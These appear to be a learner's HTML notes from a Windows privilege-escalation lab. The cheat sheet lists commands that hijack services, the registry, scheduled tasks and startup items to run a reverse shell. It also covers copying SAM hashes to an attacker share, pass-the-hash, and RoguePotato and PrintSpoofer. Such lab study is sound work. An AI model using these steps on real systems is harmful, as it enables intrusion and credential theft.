<p><span style="font-size: 30px; background-color: rgb(97, 189, 109);"><strong>Insecure Service permissions:</strong></span></p>
<p><span style="font-size: 22px;">- note you will need to set up a exe and transfer it over to the victim and set up NC</span></p>
<p><br></p>
<p><span style="font-size: 22px;">- using accesschk.exe to check user accounts permissions for &quot;daclsvc&quot; service</span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- if user has perms to change the service config (SERVICE_CHANGE_CONFIG)</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- query the service:&nbsp;</span></p>
<p><span style="font-size: 22px;">sc qc daclsvc</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- modify the service confi</span></p>
<p><span style="font-size: 22px;">sc config daclsvc binpath= &quot;\&quot;C:\PrivEsc\reverse.exe\&quot;&quot;</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- to catch the shell</span></p>
<p><span style="font-size: 22px;">net start daclsvc</span></p>
<p><span style="font-size: 22px;">-------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px;"><strong><span style="background-color: rgb(44, 130, 201);">Unquoted Service Path</span></strong></span></p>
<p><span style="font-size: 22px;">&nbsp;</span></p>
<p><span style="font-size: 22px;">querying: unquotedsvc</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">sc qc unquotedsvc</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- using accesschk.exe, note if a group is allowed to write to the directory</span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\accesschk.exe /accepteula -uwdq &quot;C:\Program Files\Unquoted Path Service\&quot;</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- copy your executable from earlier and rename</span></p>
<p><span style="font-size: 22px;">copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\Unquoted Path Service\Common.exe&quot;</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- net start unquotedsvc</span></p>
<p><span style="font-size: 22px;">--------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px;"><strong><span style="background-color: rgb(71, 85, 119); color: rgb(255, 255, 255);">Weak Registry Permissions</span></strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">querying: regsvc</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">sc qc regsvc</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- using accesschk.exe - regsvc is writeable by &quot;NT AUTH/INTERACTIVE&quot; = means anyone</span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- overwrite the image path registry to point to reverse executable</span></p>
<p><span style="font-size: 22px;">reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- net start regsvc</span></p>
<p><span style="font-size: 22px;">---------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px; background-color: rgb(243, 121, 52);"><strong>Insecure Service Executables</strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">querying: sc qc filepersvc</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">sc qc filepermsvc - runs with SERVICE_START_NAME system priv</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- using accesschk.eve - showing binary writeable by everyone</span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\accesschk.exe /accepteula -quvw &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">-copy the reverse executable and replace the filepermservice.exe with it:</span></p>
<p><span style="font-size: 22px;">copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot; /Y</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">net start filepermsvc</span></p>
<p><span style="font-size: 22px;">----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px; background-color: rgb(184, 49, 47);"><strong>Registry - Autoruns</strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- query for autorun executables</span></p>
<p><span style="font-size: 22px;">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- using accesschk.exe = writeable by everyone</span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\accesschk.exe /accepteula -wvu &quot;C:\Program Files\Autorun Program\program.exe&quot;</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- copy the reverse executable and overwrite Autorun with it</span></p>
<p><span style="font-size: 22px;">copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\Autorun Program\program.exe&quot; /Y</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- in real world we need admin to log in and engage</span></p>
<p><span style="font-size: 22px;">------------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px;"><strong><span style="background-color: rgb(251, 160, 38);">Registry - AlwaysInstallElevated</span></strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- query the registry</span></p>
<p><span style="font-size: 22px;">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></p>
<p><span style="font-size: 22px;">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- both keys set to 1 (0x1)</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- on kali generate a reverse msi&nbsp;</span></p>
<p><span style="font-size: 22px;">- transfer over to the windows</span></p>
<p><span style="font-size: 22px;">- trigger shell running with system priv</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</span></p>
<p><span style="font-size: 22px;">------------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px;"><strong><span style="background-color: rgb(250, 197, 28);">Passwords- registry</span></strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- registry can be searched for keys and values that contain word &quot;password&quot;</span></p>
<p><span style="font-size: 22px;">reg query HKLM /f password /t REG_SZ /s</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- for admin autologon creds</span></p>
<p><span style="font-size: 22px;">reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span></p>
<p><span style="font-size: 22px;">-----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px; background-color: rgb(0, 168, 133);"><strong>Password - Saved creds</strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">cmdky /list</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">runas /savecred /user:admin C:\PrivEsc\reverse.exe</span></p>
<p><span style="font-size: 22px;">-----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px; background-color: rgb(163, 143, 132);"><strong>Passwords - Security Account Manager (SAM)</strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- remember you already have smbserver running</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">copy C:\Windows\Repair\SAM \\10.10.10.10\kali\</span></p>
<p><span style="font-size: 22px;">copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- use a tool to dump the hashes</span></p>
<p><span style="font-size: 22px;">----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px; background-color: rgb(41, 105, 176);"><strong><span style="color: rgb(255, 255, 255);">Passwords - Passing the Hash</span></strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">pth-winexe -U &apos;admin%hash&apos; //10.10.0.46 cmd.exe</span></p>
<p><span style="font-size: 22px;">----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px; background-color: rgb(243, 121, 52);"><strong>Scheduled tasks</strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- view contents of the script</span></p>
<p><span style="font-size: 22px;">type C:\DevTools\CleanUp.ps1</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- seems running every min - use accesschk.exe = ability to write to file</span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- start listener and then append a line to the script which runs your reverse.exe executable</span></p>
<p><span style="font-size: 22px;">echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\CleanUp.ps1</span></p>
<p><span style="font-size: 22px;">-----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px;"><strong><span style="background-color: rgb(65, 168, 95);">Insecure GUI Apps</span></strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- start an RDP session</span></p>
<p><span style="font-size: 22px;">- you know paint is running with admin priv</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">tasklist /V | findstr mspaint.exe</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- exploit</span></p>
<p><span style="font-size: 22px;">open paint, open file - paste in: file://c:/windows/system32.cmd.exe</span></p>
<p><span style="font-size: 22px;">-----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px;"><strong><span style="background-color: rgb(247, 218, 100);">Startup apps</span></strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- using accesschk.exe = users group can write files to start up directory</span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- using cscript - run createshortcut.vbs.script - creates new shortcut to your reverse.exe in the startup directory</span></p>
<p><span style="font-size: 22px;">cscript C:\PrivEsc\CreateShortcut.vbs</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- set up listener and then simulate an admin logon using RDP with creds you found</span></p>
<p><span style="font-size: 22px;">rdesktop -u admin 10.10.0.46</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">( a shell will appear)</span></p>
<p><span style="font-size: 22px;">-----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px;"><strong><span style="background-color: rgb(209, 72, 65);">Token Impersonation - Rogue Potato</span></strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- setup a socat redirector on kali, forwarding kali port 135 to port 9999 on windows</span></p>
<p><span style="font-size: 22px;">sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.0.46:9999</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- start a listener on kali</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- log in as admin on rdp from crack creds earlier, and launch cmd as admin and execute</span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\PSExec64.exe -i -u &quot;nt authority\local service&quot; C:\PrivEsc\reverse.exe</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- start another listener&nbsp;</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- and in the local service reverse shell run the Rogue potato exploit to trigger second reverse shell</span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e &quot;C:\PrivEsc\reverse.exe&quot; -l 9999</span></p>
<p><span style="font-size: 22px;">-----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px;"><strong><span style="background-color: rgb(147, 101, 184);">Token Impersonation - printspoofer</span></strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- start listener on kali</span></p>
<p><span style="font-size: 22px;">- logon rdp as admin from cracked creds</span></p>
<p><span style="font-size: 22px;">- launch cmd as admin</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\PSExec64.exe -i -u &quot;nt authority\local service&quot; C:\PrivEsc\reverse.exe</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">- start another kali listener</span></p>
<p><span style="font-size: 22px;">- and in local service reverse shell run the folloing:</span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">C:\PrivEsc\PrintSpoofer.exe -c &quot;C:\PrivEsc\reverse.exe&quot; -i</span></p>
<p><span style="font-size: 22px;">-----------------------------------------------------------------------</span></p>
<p><span style="font-size: 30px;"><strong><span style="background-color: rgb(209, 72, 65);">Useful scripts:</span></strong></span></p>
<p><span style="font-size: 22px;"><br></span></p>
<p><span style="font-size: 22px;">winPEASany.exe</span></p>
<p><span style="font-size: 22px;">Seatbelt.exe</span></p>
<p><span style="font-size: 22px;">PowerUp.ps1</span></p>
<p><span style="font-size: 22px;">SharpUp.exe</span></p>
<p><span style='font-size: 22px; font-family: "Times New Roman", Times, serif;'>&nbsp;</span></p>
